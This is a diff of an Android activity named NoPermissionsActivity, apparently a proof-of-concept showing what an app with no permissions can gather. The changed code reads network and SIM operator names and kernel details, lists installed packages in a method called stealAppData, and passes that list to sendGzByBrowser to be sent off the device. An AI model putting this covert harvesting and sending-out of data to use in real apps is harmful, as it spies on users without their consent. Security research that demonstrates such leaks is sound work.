@@ -75,13 +75,13 @@ public class NoPermissionsActivity extends Activity {
         TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
         String op = "0", sim = "0";
         if (tm.getPhoneType() == TelephonyManager.PHONE_TYPE_GSM) {
-            op = tm.getNetworkOperator();
+            op = tm.getNetworkOperatorName();
             Log.i(TAG, "readIdentifiers - GSM Operator: " + op);
         } else {
             Log.i(TAG, "readIdentifiers - not GSM");
         }
         if (tm.getSimState() == TelephonyManager.SIM_STATE_READY) {
-            sim = tm.getSimOperator();
+            sim = tm.getSimOperatorName();
             Log.i(TAG, "readIdentifiers - SIM Operator: " + sim);
         } else {
             Log.i(TAG, "readIdentifiers - SIM Not Ready");
@@ -106,7 +106,7 @@ public class NoPermissionsActivity extends Activity {
         return URLEncoder.encode(kernel);
     }
 
-    private void stealAppDataNew() {
+    private void stealAppData() {
         List<PackageInfo> packList = getPackageManager().getInstalledPackages(0);
         StringBuilder send = new StringBuilder();
         for (int i = 0; i < packList.size(); i++) {
@@ -120,6 +120,7 @@ public class NoPermissionsActivity extends Activity {
         sendGzByBrowser(send.toString(), "apps");
     }
 
+    /*
     private void stealAppData() {
         BufferedReader applist;
         try {
@@ -150,8 +151,9 @@ public class NoPermissionsActivity extends Activity {
             applist.close();
         } catch (IOException ignored) {
         }
-
     }
+     */
+
 
     private List<String> recurse(File dir) {
         List<String> subdir = new ArrayList<>();
@@ -264,21 +266,21 @@ public class NoPermissionsActivity extends Activity {
         }
     }
 
-    private boolean isScreenOn() {
-        if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT_WATCH) {
-            DisplayManager dm = (DisplayManager) getSystemService(Context.DISPLAY_SERVICE);
-            boolean screenOn = false;
-            for (Display display : dm.getDisplays()) {
-                if (display.getState() != Display.STATE_OFF) {
-                    screenOn = true;
-                }
-            }
-            return screenOn;
-        } else {
-            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
-            return pm.isScreenOn();
-        }
-    }
+//    private boolean isScreenOn() {
+//        if (android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT_WATCH) {
+//            DisplayManager dm = (DisplayManager) getSystemService(Context.DISPLAY_SERVICE);
+//            boolean screenOn = false;
+//            for (Display display : dm.getDisplays()) {
+//                if (display.getState() != Display.STATE_OFF) {
+//                    screenOn = true;
+//                }
+//            }
+//            return screenOn;
+//        } else {
+//            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+//            return pm.isScreenOn();
+//        }
+//    }
 
     //------ overridden lifecycle methods ------
 
